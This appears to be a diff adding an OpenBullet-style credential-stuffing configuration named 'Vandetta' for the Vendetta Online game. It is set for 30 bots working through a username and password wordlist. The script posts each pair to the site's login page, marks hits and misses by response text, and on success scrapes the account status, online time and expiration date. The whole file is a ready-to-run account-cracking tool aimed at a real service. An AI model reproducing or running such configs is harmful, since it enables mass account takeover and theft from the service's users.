@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "Vandetta",
+  "SuggestedBots": 30,
+  "LastModified": "2018-06-14T23:54:37.3972442+00:00",
+  "AdditionalInfo": "",
+  "Author": "Mew",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserMail",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Login REQUEST POST "https://www.vendetta-online.com/x/login/" AutoRedirect=TRUE 
+  CONTENT "login=<USER>&password=<PASS>&submit=Login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Keywords KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "There is no account by that name" 
+    KEY "Incorrect password" 
+  KEYCHAIN Success OR 
+    KEY "Vendetta Online - News" 
+#Redirect REQUEST GET "https://www.vendetta-online.com/x/changeacct" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#Status PARSE "<SOURCE>" LR "><label>Account status:</label>" "<" Recursive=FALSE -> CAP "Account Status" "" "" 
+#Time_Online PARSE "<SOURCE>" LR "><label>Time spent online:</label>" "<" Recursive=FALSE -> CAP "Time Online" "" "" 
+#Expiration PARSE "<SOURCE>" LR "li><label>Account expiration:</label>" "<" Recursive=FALSE -> CAP "Expiration" "" "" 
